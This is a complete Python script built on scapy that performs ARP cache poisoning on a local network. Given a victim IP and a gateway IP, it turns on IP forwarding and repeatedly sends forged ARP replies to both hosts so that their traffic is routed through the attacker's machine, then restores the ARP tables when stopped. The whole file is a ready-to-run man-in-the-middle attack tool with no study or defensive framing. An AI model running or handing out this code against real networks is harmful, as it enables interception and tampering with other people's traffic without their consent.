#! /usr/bin/env python3

import argparse
from scapy.all import Ether, srp, ARP, send
import time


def enable_linux_ip_route():
    print("Enabling IP forwarding")
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 1:
            # already enabled
            return
    with open(file_path, "w") as f:
        print(1, file=f)


def parse_args():
    parser = argparse.ArgumentParser(description='Execute ARP Cache Poisoning attacks '
                                                 '(a.k.a ARP Spoofing) on local networks.')
    parser.add_argument('-t', '--target', dest='target_ip',
                        help='Victim\'s IP address to ARP poison',
                        required=True)
    parser.add_argument('-g', '--host', dest='gateway_ip',
                        help='Gateway IP address to ARP poison',
                        required=True)
    return parser.parse_args()


def getmac(target_ip):
    arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=target_ip)
    target_mac = srp(arp_packet, timeout=2, verbose=False)[0][0][1].hwsrc
    return target_mac


def spoof_arp_cache(target_ip, target_mac, host_ip, verbose=True):
    spoofed = ARP(op='is-at', pdst=target_ip, psrc=host_ip, hwdst=target_mac)
    send(spoofed, verbose=False)
    #Printing the sent packets
    self_mac = ARP().hwsrc
    print("Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))


def restore_arp_cache(target_ip, target_mac, source_ip, source_mac):
    packet = ARP(op='is-at', hwsrc=source_mac, psrc=source_ip, hwdst=target_mac, pdst=target_ip)
    send(packet, verbose=False)
    print("ARP Table restored to normal for", target_ip)


def execute():
    options = parse_args()
    target_ip = options.target_ip
    gateway_ip = options.gateway_ip

    try:
        target_mac = getmac(target_ip)
        print("Target MAC", target_mac)
    except:
        print("Target machine did not respond to ARP broadcast")
        quit()

    try:
        gateway_mac = getmac(gateway_ip)
        print("Gateway MAC:", gateway_mac)
    except:
        print("Gateway is unreachable")
        quit()

    while True:
        proceed = input('\n[!] ARP packets ready. Execute the attack with '
                        'these settings? (Y/N) ').lower()
        if proceed == 'y':
            print('\n[+] ARP Spoofing attack initiated. Press Ctrl-C to '
                  'abort.')
            break
        if proceed == 'n':
            raise KeyboardInterrupt

    try:
        enable_linux_ip_route()
        print("Sending spoofed ARP responses")
        while True:
            spoof_arp_cache(target_ip, target_mac, gateway_ip)
            spoof_arp_cache(gateway_ip, gateway_mac, target_ip)
            time.sleep(1)
    except KeyboardInterrupt:
        print("ARP spoofing stopped, restoring network please wait ...")
        restore_arp_cache(gateway_ip, gateway_mac, target_ip, target_mac)
        restore_arp_cache(target_ip, target_mac, gateway_ip, gateway_mac)
        quit()


if __name__ == "__main__":
    execute()
